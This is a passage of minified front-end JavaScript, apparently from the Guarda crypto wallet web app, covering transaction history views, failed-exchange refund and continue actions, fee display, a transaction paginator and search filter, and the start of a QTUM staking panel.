        gw.PH)(fB, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , yB = createRequestActions(mB)
          , vB = createRequestActions(pB)
          , _B = createRequestActions(fB)
          , wB = "failedExchange";
        let bB;
        kB = bB || (bB = {});
        var kB;
        const SB = {
            isFetching: !0,
            isSucceed: !1,
            isProcessing: !1,
            isError: !1
        }
          , CB = {
            list: {}
        }
          , NB = (0,
        gw.Lq)(CB, {
            [yB.STARTED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                if (e.list[n]) {
                    e.list[n].isFetching = !0;
                    return e
                }
                e.list[n] = {
                    ...SB
                };
                return e
            }
            ,
            [yB.SUCCEEDED]: (e, t) => {
                let {meta: a, payload: n} = t;
                const {id: r} = a
                  , l = e.list[r];
                e.list[r] = {
                    ...l,
                    ...n,
                    isFetching: !1
                };
                return e
            }
            ,
            [yB.ERRORED]: (e, t) => {
                let {meta: a, payload: n} = t;
                const {id: r} = a
                  , l = e.list[r];
                e.list[r] = {
                    ...l,
                    ...n,
                    isFetching: !1
                };
                return e
            }
            ,
            [yB.CANCELLED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isFetching = !1;
                return e
            }
            ,
            [vB.STARTED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isProcessing = !0;
                return e
            }
            ,
            [vB.SUCCEEDED]: (e, t) => {
                let {meta: a, payload: n} = t;
                const {id: r} = a;
                e.list[r].isProcessing = !1;
                if (n.error) {
                    e.list[r].isError = !0;
                    return e
                }
                e.list[r].isSucceed = n.result || n.success;
                return e
            }
            ,
            [vB.ERRORED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isProcessing = !1;
                e.list[n].isError = !0;
                return e
            }
            ,
            [vB.CANCELLED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isProcessing = !1;
                return e
            }
            ,
            [_B.STARTED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isProcessing = !0;
                return e
            }
            ,
            [_B.SUCCEEDED]: (e, t) => {
                let {meta: a, payload: n} = t;
                const {id: r} = a;
                e.list[r].isProcessing = !1;
                if (null != n && n.error) {
                    e.list[r].isError = !0;
                    return e
                }
                e.list[r].isSucceed = n.result;
                return e
            }
            ,
            [_B.ERRORED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isProcessing = !1;
                e.list[n].isError = !0;
                return e
            }
            ,
            [_B.CANCELLED]: (e, t) => {
                let {meta: a} = t;
                const {id: n} = a;
                e.list[n].isProcessing = !1;
                return e
            }
        })
          , selectFailedTxActionsById = e => t => e.failedExchange.list[t]
          , TB = {
            name: wB,
            reducer: NB
        };
        function ViewFailedExchangeTxActions(e) {
            var t, a, n, r;
            let {tx: l} = e;
            const s = (0,
            $.I0)()
              , i = undefined
              , o = (0,
            $.v9)(selectFailedTxActionsById)(l.exchangeId);
            (0,
            O.useEffect)(( () => {
                s(EB({
                    id: l.exchangeId
                }))
            }
            ), [l.exchangeId]);
            function handleClickContinue(e) {
                s(hB({
                    id: e.exchangeId
                }))
            }
            function handleClickRefund(e, t) {
                const {refund: {additionalAddressList: a}} = e
                  , n = a.find((e => e === t.addressFrom));
                s(gB({
                    id: t.exchangeId,
                    address: n || "",
                    extraId: ""
                }))
            }
            const c = (null == o || null === (t = o.refund) || void 0 === t ? void 0 : t.available) || (null == o || null === (a = o.continue) || void 0 === a ? void 0 : a.available)
              , u = !(null != o && o.isProcessing || null != o && o.isSucceed || null != o && o.isFetching || null != o && o.isError)
              , d = null == o ? void 0 : o.isError;
            return O.createElement(O.Fragment, null, (null == o ? void 0 : o.isProcessing) && O.createElement("div", {
                className: qR.exchangeFailedBlock
            }, O.createElement(loader, {
                visible: !0,
                width: 20
            }), O.createElement("span", {
                className: qR.loaderText
            }, "Processing...")), (null == o ? void 0 : o.isFetching) && !d && O.createElement("div", {
                className: qR.exchangeFailedBlock
            }, O.createElement(loader, {
                visible: !0,
                width: 20
            })), d && O.createElement("div", {
                className: Ht()(qR.exchangeFailedBlock, qR.error)
            }, "Failed. Please, contact support"), c && u && O.createElement("div", {
                className: qR.exchangeFailedBlock
            }, (null === (n = o.refund) || void 0 === n ? void 0 : n.available) && O.createElement(O.Fragment, null, O.createElement(Yl, {
                color: "light-blue",
                size: "small",
                onClick: () => handleClickRefund(o, l)
            }, "Refund ", (0,
            Ko.i1)(o.refund.amount), " ", l.currencyFrom.toUpperCase())), (null === (r = o.continue) || void 0 === r ? void 0 : r.available) && O.createElement(O.Fragment, null, O.createElement(Yl, {
                color: "blue",
                size: "small",
                onClick: () => handleClickContinue(l)
            }, "Continue ", (0,
            Ko.i1)(o.continue.currentEstimate), " ", l.currencyTo.toUpperCase()))))
        }
        ViewFailedExchangeTxActions.propTypes = {
            tx: as().object.isRequired
        };
        const FooterButton = e => {
            let {href: t, title: a} = e;
            return O.createElement("a", {
                href: t,
                target: "_blank",
                rel: "noopener noreferrer"
            }, O.createElement(Yl, {
                color: "light-blue",
                size: "small"
            }, a))
        }
          , AB = FooterButton;
        function RepeatButton(e) {
            let {gas: t, fromWalletUuid: a, addressFrom: n, currencyFrom: r, addressTo: l, currencyTo: s, amount: i, type: o, family: c, extraId: u} = e;
            const d = (0,
            j.k6)()
              , m = (0,
            $.v9)(eu)
              , p = (0,
            $.v9)(au)
              , handleRepeatTx = () => {
                const e = {};
                t && (e.gasLimit = t);
                let f;
                if (a)
                    f = m(a || null);
                else {
                    f = p(n || "", c || (r || ""));
                    if (f && c !== r) {
                        const e = f.subWallets.find((e => e.currency.toLowerCase() === (null == r ? void 0 : r.toLowerCase())));
                        f = e || f
                    }
                }
                const E = p(l || "", s || "");
                f && (e.walletFrom = f.uuid);
                if (E) {
                    e.currencyTo = E.currency;
                    e.walletTo = E.uuid
                } else {
                    e.addressTo = l;
                    e.currencyTo = s
                }
                i && (e.amount = i);
                u && (e.extraId = u);
                const h = {
                    exchange: "/exchange",
                    send: "/send",
                    buy: "/buy"
                };
                d.push({
                    pathname: (0,
                    M.RU)(h[o]),
                    search: objectToString(e)
                })
            }
            ;
            return O.createElement(Yl, {
                color: "light-blue",
                size: "small",
                onClick: handleRepeatTx
            }, "Repeat transaction")
        }
        const xB = RepeatButton;
        function TxBuyFooter(e) {
            let {status: t, paymentId: a, addressTo: n, currencyTo: r, amount: l} = e;
            const s = isBuyErrorStatus(t) && t !== tc.EXPIRED
              , i = isCheckDetailsStatus(t)
              , o = isRepeatStatus(t);
            return t ? O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, " "), O.createElement("div", null, !s && t === ac.APPRUVED && O.createElement(O.Fragment, null, O.createElement(AB, {
                href: "https://www.trustpilot.com/evaluate/guarda.co",
                title: "Rate us"
            }), a && O.createElement(AB, {
                href: `https://payment-status.simplex.com/#/payment/${a}`,
                title: "Check status"
            })), !s && i && O.createElement(O.Fragment, null, a && O.createElement(AB, {
                href: `https://payments.guardarian.com/checkout?tid=${a}&redirectAfterPaidUrl=https%3A%2F%2Fguarda.co%2Fapp%2Fbuy`,
                title: t === tc.WATING_FOR_RISK_CONTROL ? "Continue" : "Check details"
            })), !s && o && O.createElement(O.Fragment, null, a && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, " "), O.createElement("div", null, O.createElement(xB, {
                addressTo: n,
                currencyTo: r,
                amount: l,
                type: "buy"
            })))), s && O.createElement(AB, {
                href: "https://support.guarda.com",
                title: "Contact Support"
            }))) : O.createElement(O.Fragment, null)
        }
        const IB = TxBuyFooter;
        function ViewFooter(e) {
            var t, a, n, r;
            let {tx: l, isWatchOnly: s} = e;
            const i = isFinishedExchange(l)
              , o = isFailedExchangeTx(l)
              , c = isXtzDelegation(l)
              , u = isExchange(l)
              , d = isBuy(l)
              , m = isSell(l)
              , p = [isTrxClaiming, isTrxStaking, isTrxUnstaking, isTrxDelegating, isTrxUndelegating, isTrxWithdrawUnfreezedStaking, isTrxCancelUnstake].some((e => e(l)))
              , f = isOntFee(l)
              , E = isExtraAmount(l)
              , h = isZilStaking(l) || isZilWithdrawStakeAmt(l) || isZilCompleteWithdrawal(l) || isZilWithdrawStakeRewards(l)
              , g = isCloStaking(l) || isCloStakingReward(l) || isCloStakingWithdraw(l)
              , y = !(u || m || c || p || f)
              , v = !s && !l.isIncoming && !isEthStaking(l) && !isXrpCloseAccount(l) && !h && l.addressTo && l.addressFrom && y && !g;
            return O.createElement(O.Fragment, null, v && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, " "), O.createElement("div", null, O.createElement(xB, {
                gas: l.extra && l.extra.gas ? l.extra.gas : void 0,
                fromWalletUuid: l.extra && l.extra.fromWalletUuid ? l.extra.fromWalletUuid : void 0,
                addressFrom: l.addressFrom,
                currencyFrom: l.currencyFrom,
                addressTo: l.addressTo,
                currencyTo: l.currencyTo,
                type: u ? "exchange" : "send",
                amount: null === (t = l.amount) || void 0 === t ? void 0 : t.toString(),
                family: l.family,
                extraId: (null === (a = l.extra) || void 0 === a ? void 0 : a.data) || void 0
            }))), !s && u && !i && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.failedTxActions)
            }, O.createElement("span", null, " "), O.createElement("div", null, O.createElement(AB, {
                href: "https://support.guarda.com",
                title: "Contact Support"
            })), o && O.createElement(ViewFailedExchangeTxActions, {
                tx: l
            })), u && i && !s && E && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.txExtraAmount)
            }, O.createElement("span", null, "Congratulations!"), O.createElement("div", null, "You received extra ", null == l || null === (n = l.currencyTo) || void 0 === n ? void 0 : n.toUpperCase(), " as a result of exchange rate volatility")), u && i && !s && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, " "), O.createElement("div", {
                className: qR.footerButtons
            }, O.createElement("div", null, O.createElement("a", {
                href: "https://www.trustpilot.com/evaluate/guarda.co",
                target: "_blank",
                rel: "noopener noreferrer"
            }, O.createElement(Yl, {
                color: "light-blue",
                size: "small"
            }, "Rate us"))), O.createElement("div", null, O.createElement(xB, {
                gas: l.extra && l.extra.gas ? l.extra.gas : void 0,
                fromWalletUuid: l.extra && l.extra.fromWalletUuid ? l.extra.fromWalletUuid : void 0,
                addressFrom: l.addressFrom,
                currencyFrom: l.currencyFrom,
                addressTo: l.addressTo,
                currencyTo: l.currencyTo,
                type: u ? "exchange" : "send",
                amount: l.amountFrom ? l.amountFrom.toString() : void 0,
                family: l.family
            })))), d && O.createElement(IB, {
                addressTo: l.addressTo,
                currencyTo: l.currencyTo,
                amount: null === (r = l.amountTo) || void 0 === r ? void 0 : r.toString(),
                status: l.extra && l.extra.status ? l.extra.status : void 0,
                paymentId: l.extra && l.extra.paymentId ? l.extra.paymentId : void 0
            }))
        }
        const PB = ViewFooter;
        function ViewDate(e) {
            let {tx: t} = e;
            return O.createElement(O.Fragment, null, !!t.timestamp && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Date"), O.createElement("div", null, date_format(t.timestamp, "transactions-date"))), !!t.timestamp && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Time"), O.createElement("div", null, date_format(t.timestamp, "transactions-time"))))
        }
        ViewDate.propTypes = {
            tx: as().object
        };
        function ViewFeeWithEstimate(e) {
            let {negative: t, altFee: a, fee: n, currency: r, simpleWalletObject: l} = e;
            const {convertToFiat: s, isAvailableRate: i} = useConverter()
              , o = undefined
              , c = validateFee(n) && i(l) ? s(n, l) : null;
            return O.createElement(O.Fragment, null, t && "-", a && String(a) || n, " ", a ? "Bandwidth" : (0,
            be.xG)(r), c && O.createElement(O.Fragment, null, " ", "~ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: c,
                renderCurrency: !0
            })))
        }
        function ViewMaxFee(e) {
            let {tx: t, simpleWalletObject: a} = e
              , n = t.fee || "0";
            if ("0" === n && t.extra) {
                const {gas: e, gasPrice: a} = t.extra;
                n = (0,
                Ko.$q)((0,
                Ko.$q)(e, (0,
                Ko.$q)(a, 1e-9)), 1e-9)
            }
            n = String(n);
            return O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Max Network Fee"), O.createElement("div", null, O.createElement(ViewFeeWithEstimate, {
                fee: n,
                currency: t.family || "",
                simpleWalletObject: a
            })))
        }
        const LB = undefined
          , view_fee = e => {
            var t, a;
            let {tx: n} = e;
            const r = n.family && n.family !== n.currencyTo
              , l = null === (t = Se.Z.getRootMetadata(n.currencyFrom)) || void 0 === t || null === (a = t.coin) || void 0 === a ? void 0 : a.feePath
              , s = l && "sub" === l.path
              , i = getSimpleWalletObjectForFee(n);
            return ("eth" === n.family || "eth" === n.currencyFrom && "eth" === n.currencyTo) && isPendingTx(n) ? O.createElement(ViewMaxFee, {
                tx: n,
                simpleWalletObject: i
            }) : O.createElement(O.Fragment, null, void 0 !== n.fee && !s && !isGethDeposit(n) && validateFee(n.fee) && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Network Fee"), O.createElement("div", {
                className: qR.userSelect
            }, n.additionalSent ? O.createElement(ViewFeeWithEstimate, {
                negative: !n.isIncoming,
                fee: n.additionalSent,
                currency: n.family,
                simpleWalletObject: i
            }) : O.createElement(ViewFeeWithEstimate, {
                altFee: n.bandwidthFee,
                fee: n.fee,
                currency: r ? n.family : n.currencyFrom,
                simpleWalletObject: i
            }))))
        }
        ;
        function view_dev_ViewDate(e) {
            let {tx: t} = e;
            const [a,n] = (0,
            O.useState)(!1);
            return M.CM ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: "dashedNormal",
                onClick: () => n(!a)
            }, "Toggle dev panel"), a && O.createElement(O.Fragment, null, O.createElement("hr", null), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Dev key")), O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock, qR.devLine)
            }, t.primaryKey), O.createElement("hr", null), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Raw")), O.createElement("div", {
                className: qR.stringify
            }, JSON.stringify(t, null, 4)), O.createElement("br", null), O.createElement("hr", null), O.createElement("br", null))) : null
        }
        view_dev_ViewDate.propTypes = {
            tx: as().object
        };
        function isTransactionContractData(e) {
            return "object" == typeof e && "string" == typeof e.resource
        }
        function TxTronDelegation(e) {
            let {tx: t} = e;
            return isTransactionContractData(null == t ? void 0 : t.contractData) ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Resource"), O.createElement("div", null, t.contractData.resource))) : null
        }
        const TransactionItem_TransactionItem = e => {
            const {tx: t, params: a} = e
              , n = getTxHash(t)
              , [r,l] = (0,
            O.useState)((null == a ? void 0 : a.txId) === n && !!n)
              , s = watch_only(t)
              , i = hw_address(t)
              , o = isBuy(t)
              , c = isSell(t)
              , u = isKmdClaim(t)
              , d = isExchange(t)
              , m = isMultisig(t)
              , p = isMultisigTxs(t)
              , f = isXtzDelegation(t)
              , E = isTrxDelegating(t) || isTrxUndelegating(t)
              , h = isFio(t)
              , g = !(u || d || o || m || c || h)
              , y = (0,
            $.v9)(nu)
              , v = y(t.addressFrom || "", t.currencyFrom || "")
              , _ = y(t.addressTo || "", t.currencyTo || "")
              , {isSpamToken: w, isUnknownToken: b} = useSpamAndUnknownToken({
                family: null == v ? void 0 : v.family,
                smartContract: null == v ? void 0 : v.smartContract
            })
              , {isSpamToken: k, isUnknownToken: S} = useSpamAndUnknownToken({
                family: null == _ ? void 0 : _.family,
                smartContract: null == _ ? void 0 : _.smartContract
            })
              , C = (0,
            O.useMemo)(( () => w || k), [w, k])
              , N = (0,
            O.useMemo)(( () => b || S), [b, S])
              , T = (0,
            O.useMemo)(( () => w ? null == v ? void 0 : v.family : k ? null == _ ? void 0 : _.family : void 0), [w, k])
              , A = (0,
            O.useMemo)(( () => b ? null == v ? void 0 : v.family : S ? null == _ ? void 0 : _.family : void 0), [b, S]);
            function handleOpenTransaction() {
                l(!r);
                null != e && e.onOpen && "function" == typeof (null == e ? void 0 : e.onOpen) && e.onOpen(t, !r)
            }
            return O.createElement("div", {
                className: Ht()(qR.txBlock, {
                    [qR.isVisibleDetails]: r
                })
            }, O.createElement("div", {
                className: qR.txLine,
                onClick: handleOpenTransaction
            }, O.createElement("div", {
                className: qR.txDate
            }, t.timestamp ? date_format(t.timestamp, "transactions-time") : null), O.createElement("div", {
                className: qR.txInlineHash
            }, O.createElement(ViewHeader, {
                tx: t
            })), O.createElement("div", {
                className: Ht()(qR.txAmount, {
                    [qR.error]: isErrorTx(t),
                    [qR.isIncoming]: t.isIncoming && !isErrorTx(t) && !isEthStaking(t) || isAtomUndelegate(t) || isTrxUnstaking(t),
                    [qR.isPending]: isPendingTx(t)
                })
            }, oc && s && O.createElement("div", {
                className: qR.woMark
            }, "(WO)"), oc && i && O.createElement("div", {
                className: qR.woMark
            }, "(Ledger)"), C ? O.createElement(SpamTokenNotify_SpamTokenNotify, {
                family: T,
                type: "txList"
            }) : N && O.createElement(UnknownTokenNotify_UnknownTokenNotify, {
                family: A,
                type: "txList"
            }), O.createElement(ViewAmountTop, {
                tx: t
            }))), r && O.createElement("div", {
                className: Ht()(qR.txDetails, {
                    [qR.fullWidth]: oc
                })
            }, O.createElement(ViewDate, {
                tx: t
            }), d && O.createElement(TxExchnageView, {
                tx: t
            }), o && O.createElement(TxBuyView, {
                tx: t
            }), g && O.createElement(TxNormalView, {
                tx: t
            }), E && O.createElement(TxTronDelegation, {
                tx: t
            }), m && O.createElement(TxMultisigView, {
                tx: t
            }), p && O.createElement(TxMultisigTxsView, {
                tx: t
            }), c && O.createElement(TxSellView, {
                tx: t
            }), !h && O.createElement(ViewFromTo, {
                tx: t
            }), h && O.createElement(TxFioView, {
                tx: t
            }), u && O.createElement(TxClaimKmd, {
                tx: t
            }), f && O.createElement(tx_xtz_delegation_TxClaimKmd, {
                tx: t
            }), O.createElement(ViewHashes, {
                tx: t
            }), O.createElement(ViewAtomStaking, {
                tx: t
            }), O.createElement(ViewXmrKeys, {
                tx: t
            }), (g || d) && O.createElement(view_fee, {
                tx: t
            }), O.createElement(ViewExtra, {
                tx: t
            }), O.createElement(PB, {
                tx: t,
                isWatchOnly: s
            }), O.createElement(view_dev_ViewDate, {
                tx: t
            })))
        }
          , FB = "transaction-paginator_showMoreButton_18ifb"
          , WB = 20
          , TransactionPaginator = e => {
            const [t,a] = (0,
            O.useState)(e.limit || WB)
              , groupByDate = e => {
                const t = e.reduce(( (e, t) => {
                    let a = new Date(t.timestamp);
                    t.timestamp || (a = new Date);
                    const n = date_format(a, "dd mmm yyyy");
                    if (!e[n])
                        return Object.assign(e, {
                            [n]: {
                                date: n,
                                list: [t]
                            }
                        });
                    e[n].list.push(t);
                    return e
                }
                ), {});
                return Object.values(t) || []
            }
              , n = (0,
            O.useMemo)(( () => e.txs.slice(0, t)), [t, e.txs, null == e ? void 0 : e.txs.length])
              , r = groupByDate(n);
            return O.createElement(O.Fragment, null, r.map((t => e.children({
                ...t,
                key: null == t ? void 0 : t.primaryKey
            }))), e.txs.length - n.length > 0 && O.createElement("div", {
                className: FB,
                onClick: () => a((e => e + WB))
            }, "Show more"))
        }
        ;
        TransactionPaginator.propTypes = {
            txs: as().array,
            children: as().any,
            limit: as().number
        };
        const RB = TransactionPaginator
          , BB = a.p + "b4167d4ba0df7168b2d1ed1690751cf6.svg"
          , useOpenTransaction = () => {
            const e = (0,
            $.v9)(au)
              , t = (0,
            $.I0)()
              , a = O.useCallback(( (a, n) => {
                if (!n)
                    return;
                const r = a.extra || {}
                  , l = a.family || a.currencyFrom || a.currency || (null == r ? void 0 : r.currencyFrom)
                  , s = a.isIncoming ? a.addressTo || (null == r ? void 0 : r.addressTo) : a.addressFrom || (null == r ? void 0 : r.addressFrom)
                  , i = e(s || "", l || "");
                i && t(updateWalletsBalanceAndTxs(i, {
                    isCascade: !0
                }))
            }
            ), [t, e]);
            return [a]
        }
          , OB = useOpenTransaction
          , search_reg_exp_in_string = (e, t) => -1 !== String(escape_search(e)).search(t)
          , useProcessTransactions = e => {
            let {filter: t, allTxs: a, params: n} = e;
            const [r,l] = (0,
            O.useState)([])
              , s = (0,
            $.v9)(selectedMultisigsAddresses)
              , isMultisigAddress = e => e.addressFrom ? s.indexOf(e.addressFrom) > -1 : !!e.addressTo && s.indexOf(e.addressTo) > -1
              , i = undefined;
            return [async () => {
                const e = t.text && !!t.text.trim()
                  , r = t.type && "all" !== t.type
                  , s = !!t.wallet;
                if (null != n && n.txId) {
                    const e = a.find((e => {
                        const t = getTxHash(e);
                        return n.txId === t && t
                    }
                    ));
                    if (e) {
                        const t = a.indexOf(e);
                        a.splice(t, 1);
                        a.unshift(e)
                    }
                }
                if (!e && !r && !s) {
                    l(a.filter((e => !isMultisigAddress(e) || "0" !== e.amount)));
                    return
                }
                let i = "";
                i = t.wallet && t.wallet.type && t.wallet.type === we.uQ.BTC_LIKE_SEGWIT_WALLET ? t.wallet.title : t.wallet ? (t.wallet.accountName || t.wallet.address || "").toLowerCase() : "";
                const o = new RegExp(encodeURI(escape_search(t.text)),"i")
                  , c = a.filter((a => {
                    var n;
                    const l = []
                      , c = []
                      , u = [];
                    e && l.push(search_reg_exp_in_string(a.hash, o), search_reg_exp_in_string(a.addressFrom, o), search_reg_exp_in_string(a.addressTo, o), search_reg_exp_in_string(a.amount, o), search_reg_exp_in_string(a.transactionId, o), search_reg_exp_in_string(a.currencyFrom, o), search_reg_exp_in_string(a.currencyTo, o));
                    if (r) {
                        "received" === t.type && c.push(a.isIncoming);
                        if ("send" === t.type) {
                            const e = isBuy(a)
                              , t = isSell(a)
                              , n = isKmdClaim(a)
                              , r = isExchange(a)
                              , l = isXtzDelegation(a)
                              , s = isAtomUndelegate(a)
                              , i = isAtomDelegate(a)
                              , o = isFio(a)
                              , u = isKinActivation(a)
                              , d = isHbarAccountCreation(a)
                              , m = isHbarUnknown(a)
                              , p = isMultisig(a) || isMultisigTxs(a)
                              , f = isTrxClaiming(a) || isTrxUnstaking(a)
                              , E = !(n || r || e || p || t || l || o || s || i || u || p || d || m || f);
                            c.push(!a.isIncoming);
                            c.push(E)
                        }
                        "exchange" === t.type && c.push("exchange" === a.type);
                        "buy" === t.type && c.push("buy" === a.type);
                        "multisig" === t.type && c.push(isMultisig(a) || isMultisigTxs(a) || isMultisigAddress(a))
                    }
                    if (s && null != t && null !== (n = t.wallet) && void 0 !== n && n.isSubWallet && "exchange" !== (null == a ? void 0 : a.type)) {
                        var d, m;
                        c.push((null == a || null === (d = a.currencyFrom) || void 0 === d ? void 0 : d.toLocaleLowerCase()) === (null === (m = t.wallet.currency) || void 0 === m ? void 0 : m.toLocaleLowerCase()))
                    }
                    if (s) {
                        var p;
                        const {addressFrom: e, addressTo: n, isIncoming: r, currencyTo: l, currencyFrom: s} = a;
                        let o = (0,
                        Ho.t)((null === (p = t.wallet) || void 0 === p ? void 0 : p.currency) || "");
                        "ada-shelley" === o && (o = "ada");
                        u.push((o === (0,
                        Ho.t)(s || "") || o === (0,
                        Ho.t)(l || "")) && ((0,
                        Ho.t)(e || "") === (0,
                        Ho.t)(i) && !r || (0,
                        Ho.t)(n || "") === (0,
                        Ho.t)(i) && r || (!e || !n || "exchange" === (null == a ? void 0 : a.type)) && ((0,
                        Ho.t)(i) === (0,
                        Ho.t)(e || "") || (0,
                        Ho.t)(i) === (0,
                        Ho.t)(n || ""))))
                    }
                    return (!u.length || u.some((e => e))) && (!c.length || c.every((e => e))) && (!l.length || l.some((e => e)))
                }
                ));
                l(c)
            }
            , r]
        }
          , DB = useProcessTransactions;
        function WalletHistoryBlock(e) {
            let {wallet: t, params: a, newCoinOrToken: n} = e;
            const r = (0,
            $.I0)()
              , l = (0,
            $.v9)(Eu)
              , s = (0,
            $.v9)(zc)
              , [i,o] = (0,
            O.useState)({})
              , [c,u] = (0,
            O.useState)([])
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)("/receive")
              , [E,h] = (0,
            O.useState)("/buy")
              , [g] = OB()
              , [y,v] = DB({
                filter: i,
                allTxs: l,
                params: a
            })
              , _ = (0,
            O.useCallback)((e => i.wallet && i.wallet.currency === e), [i.wallet]);
            (0,
            O.useEffect)((function onSetUrl() {
                if (i.wallet) {
                    f(`/receive?wallet=${i.wallet.uuid}`);
                    h(`/buy?walletTo=${i.wallet.uuid}`)
                }
            }
            ), [i.wallet]);
            (0,
            O.useEffect)((function onSetIsTransactions() {
                m(!!c.length)
            }
            ), [c]);
            (0,
            O.useEffect)((function onGetFilteredTransactions() {
                y()
            }
            ), [t.address, t.currency, l, i]);
            (0,
            O.useEffect)((function onFilterTransactionsByAddressAndType() {
                let e = "";
                e = t && t.type && t.type === we.uQ.BTC_LIKE_SEGWIT_WALLET ? t.title.toLowerCase() : t ? (t.accountName || t.address || "").toLowerCase() : "";
                const a = v.filter((t => {
                    var a, n, r, l;
                    return (null === (a = t.addressFrom) || void 0 === a ? void 0 : a.toLowerCase()) === e && !t.isIncoming || (null === (n = t.addressTo) || void 0 === n ? void 0 : n.toLowerCase()) === e && t.isIncoming || (!t.addressFrom || !t.addressTo) && (e === (null === (r = t.addressFrom) || void 0 === r ? void 0 : r.toLowerCase()) || "") || e === (null === (l = t.addressTo) || void 0 === l ? void 0 : l.toLowerCase()) || ""
                }
                ));
                u(a)
            }
            ), [v]);
            async function handleUpdate() {
                r(rd.setIsLoadingCreatingWallet(!0));
                if (i.wallet) {
                    r(updateWalletsBalanceAndTxs(i.wallet, {
                        isCascade: !0
                    }));
                    r(updateInternalTxs(!0));
                    setTimeout(( () => r(rd.setIsLoadingCreatingWallet(!1))), 2e3)
                } else {
                    r(updateWalletsData_updateAllWallets({
                        force: !0,
                        txs: !0,
                        balance: !1
                    }));
                    r(updateInternalTxs(!0));
                    setTimeout(( () => r(rd.setIsLoadingCreatingWallet(!1))), 2e3)
                }
            }
            return O.createElement("div", {
                className: Ht()(ZF.wrapperPaginator, {
                    [ZF.isEmpty]: !d
                })
            }, O.createElement("div", {
                className: ZF.wrapperShadow
            }, O.createElement("div", {
                className: ZF.chartTitle
            }, "Wallet transactions"), O.createElement("div", {
                className: ZF.filterWrapper
            }, !n && O.createElement(BoardHistoryFilter, {
                onFilterAccept: o,
                filterForOneWallet: !0,
                oneWallet: t
            }))), d || _("xmr") ? O.createElement(O.Fragment, null, O.createElement(xR, {
                isLoading: s,
                handleUpdate
            }), O.createElement(RB, {
                txs: c,
                limit: 5
            }, (e => O.createElement("div", {
                key: `tx-list${e.date}`
            }, O.createElement("div", {
                className: ZF.txDateBlock
            }, e.date), e.list.map(( (e, t) => O.createElement(sb, {
                isSend: !1,
                key: e.primaryKey || t
            }, O.createElement(TransactionItem_TransactionItem, {
                tx: e,
                onOpen: g,
                params: a
            })))))))) : O.createElement("div", {
                className: ZF.wrapperTextCenter
            }, O.createElement("img", {
                src: BB,
                alt: "Transaction not found"
            }), n ? O.createElement("div", null, "There will be your transactions") : O.createElement(O.Fragment, null, O.createElement("p", null, "Top up your wallet or  ", O.createElement(Y.OL, {
                to: (0,
                M.RU)(p)
            }, "share your public address"), O.createElement("br", null), "with somebody to get coins or tokens."), !(0,
            M.tq)() && !(0,
            M.p1)() && O.createElement(Y.OL, {
                to: (0,
                M.RU)(E)
            }, O.createElement(Yl, {
                color: "blue"
            }, "Buy crypto")), s ? O.createElement("div", {
                className: ZF.blockLoader
            }, O.createElement("span", null, s ? "Fetching transactions" : null), O.createElement(LoaderDots, {
                visible: !0
            })) : O.createElement("div", {
                className: ZF.loadTransactionsWrapper
            }, O.createElement("span", {
                className: "dashedNormal",
                onClick: handleUpdate
            }, "Load transactions")))))
        }
        const MB = WalletHistoryBlock
          , UB = "qtum_wrapper_3zXSA main_block_15zml"
          , StakingPanel = e => {
            let {wallet: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(ax)
              , r = undefined
              , l = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , [s,i] = (0,
            O.useState)(null)
              , [o,c] = (0,
            O.useState)(!0)
              , {handleGo: u} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , {convertToFiat: d} = useConverter()
              , m = t.watchOnly
              , p = Boolean(!n && t);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (p && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    a(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: []
                    }))
                }
            }
            ), [a, t, p]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    c(!0);
                    i(null);
                    a(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (n) {
                    if (n && "type"in n.dto && "STAKING_INFO_SUCCESS" === n.dto.type) {
                        const e = n.dto;
                        i(e)
                    }
                    c(!1)
                }
            }
            ), [n]);
            (0,
            O.useEffect)((function useStakingInfoFromStorage() {
                if (l && l && "type"in l.dto && "STAKING_INFO_SUCCESS" === l.dto.type) {
                    const e = l.dto;
                    i(e)
                }
            }
            ), [l]);
            if (t.isNewWallet)
                return O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                    className: HA.userSelect
                }, "0 QTUM"), " ", O.createElement(jA, {
                    value: d(0, t)
                }), O.createElement("br", null), O.createElement("br", null), O.createElement(Yl, {
                    color: "blue",
                    onClick: u({
                        path: (0,
                        M.RU)("/staking-qtum/staking"),
                        wallet: t,
                        isNewToken: !1,
                        isNewWallet: !0,
                        parentWallet: null,
